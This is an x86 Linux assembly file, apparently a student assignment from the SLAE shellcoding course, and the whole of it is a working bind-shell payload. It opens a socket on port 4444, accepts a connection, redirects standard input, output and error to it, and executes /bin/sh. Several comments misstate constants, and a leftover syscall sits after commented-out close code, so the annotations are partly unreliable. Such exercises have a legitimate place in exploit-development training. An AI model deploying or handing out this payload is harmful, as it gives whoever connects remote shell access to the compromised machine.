
; SLAE Assignment 1
; SLAE - 1501

global _start:

section .text

_start:
	;
	; SETUP STACK FOR ARGUMENTS PASSED TO SYS_SOCKET SYSCALL
	;
	xor eax, eax          ; clear eax
	push eax              ; 0

	mov al, 0x01          ; 1 for SOCK_STREAM
	push eax

	mov al, 0x02          ; 2 for AF_INET
	push eax

	;
	; SETUP ARGS BEING PASSED TO SYS_SOCKET SYSCALL
	;
	mov al, 0x66          ; for socket syscall

	xor ebx, ebx
	mov bl, 0x01          ; socketcall takes 1 for SYS_SOCKET
	
	mov ecx, esp
	int 0x80           ; 102, SYS_SOCKET, socket_args*

	;
	; SETUP STACK FOR ARGUMENTS PASSED TO SYS_BIND SYSCALL
	;
	mov edi, eax          ; hold sockfd returned by syscall DO NOT USE UNTIL CLOSED

	; set up stack with sockaddr_in
	xor eax, eax
	push eax              ; 0 for INADDR_ANY

	push word 0x115c      ; 0x115c for port 4444
	
	mov al, 0x02
	push eax              ; 2 for AF_INET
	
	mov esi, esp          ; keep track of *sockaddr_in

    ; push args for bind
   	push byte 0x10        ; 16 for len of sockaddr_in
	mov ecx, esp          ; keeps track of *addrlen
	push esi              ; for *sockaddr_in  DO NOT CHANGE UNTIL ACCEPT
	push edi              ; for sockfd

	;
	; SETUP ARGS PASSED TO SYS_BIND SYSCALL
	;
	mov ecx, esp

	xor ebx, ebx 
	mov bl, 0x02          ; socketcall takes 1 for SYS_BIND

	xor eax, eax
	mov al, 0x66          ; for socket syscall

	int 0x80              ; 102, SYS_BIND, socket_args*

	;
	; SETUP STACK FOR ARGUMENTS PASSED TO SYS_LISTEN SYSCALL
	;
	xor eax, eax
	mov al, 0x01
	push eax              ; for 1 incoming connection
	push edi              ; for sockfd

	;
    ; SETUP ARGS PASSED TO SYS_LISTEN SYSCALL
    ;
	mov ecx, esp

	xor ebx, ebx
    mov bl, 0x04          ; socketcall takes 4 for SYS_LISTEN

    xor eax, eax
    mov al, 0x66          ; for socket syscall

	int 0x80              ; 102, SYS_LISTEN, socket_args*
	
	push ecx              ; for *addrlen

	;
	; SETUP STACK FOR ARGUMENTS PASSED TO SYS_ACCEPT SYSCALL
	;

	push byte 0x10
	push esp              ; for *addr_len
	push esi              ; for *sockaddr_in (HELD SINCE BIND)
    push edi              ; for sockfd (HELD SINCE BIND)

	;
	; SETUP ARGS PASSED TO SYS_ACCEPT SYSCALL
	;

	mov ecx, esp

    xor ebx, ebx
    mov bl, 0x05          ; socketcall takes 5 for SYS_ACCEPT

    xor eax, eax
    mov al, 0x66          ; for socket syscall

    int 0x80              ; 102, SYS_ACCEPT, socket_args*

	;
	; PERFORM 3 DUP2 FOR STDOUT, STDIN, AND STDERR FOR CHILD PROCESS
	;
	push eax              ; temporarily holding CONNECTION fd so as to not lose track
	;mov ebx, edi          ; setup for sockfd close
	;mov edi, eax          ; hold new connection fd
	;xor eax, eax
	;mov al, 0x06          ; syscall for close
	
	int 0x80              ; -> syscall to close original sock fd

	xor eax, eax
	mov al, 0x3f          ; hex for 63 dup2 syscall
	pop ebx               ; now holds accept fd
	xor ecx, ecx          ; 0 for stdin

	int 0x80              ; (accept), 0   -> syscall sets stdin fd to accepted sock fd
	
	xor eax, eax
	mov al, 0x3f          ; hex for 63
	mov cl, 0x01          ; 1 for stdout
	int 0x80              ; (accept), 1   -> syscall sets stdout fd to accepted sock fd

	xor eax, eax
	mov al, 0x3f          ; hex for 63
	mov cl, 0x02          ; 1 for stderr
	int 0x80              ; (accept), 2   -> syscall sets stderr fd to accepted sock fd

	jmp short load_bin_sh_addr

exec_shell:
	pop ebx               ; get address of /bin//sh for string adjustment
	;push dword [ebx+4]
	;push [ebx]            ; move 
	mov edi, [ebx+4]
	shr edi, 8            ; shifts //sh 8 bits to remove '/' and end in '\0' -> could have left / and ended in NULL/addr and byte
	mov [ebx+4], edi      ;                                                                     EBX READY

	xor eax, eax
	push eax              ; set NULL arg for envp, and end of argv
	
	mov edx, esp          ; Set envp to NULL -> could have also 0'd out edx instead             EDX READY
	mov al, 0x0b          ; hex for 11 -> execve syscall                                        EAX READY
	
	push ebx              ; address of /bin/sh as first and only arg in argv (ended by NULL)
	mov ecx, esp          ; setting argv                                                        ECX READY
	

	int 0x80 ; "//bin/sh", *argv, *envp               -> syscall

load_bin_sh_addr:
	call exec_shell
	bin_sh: db "/bin//sh"
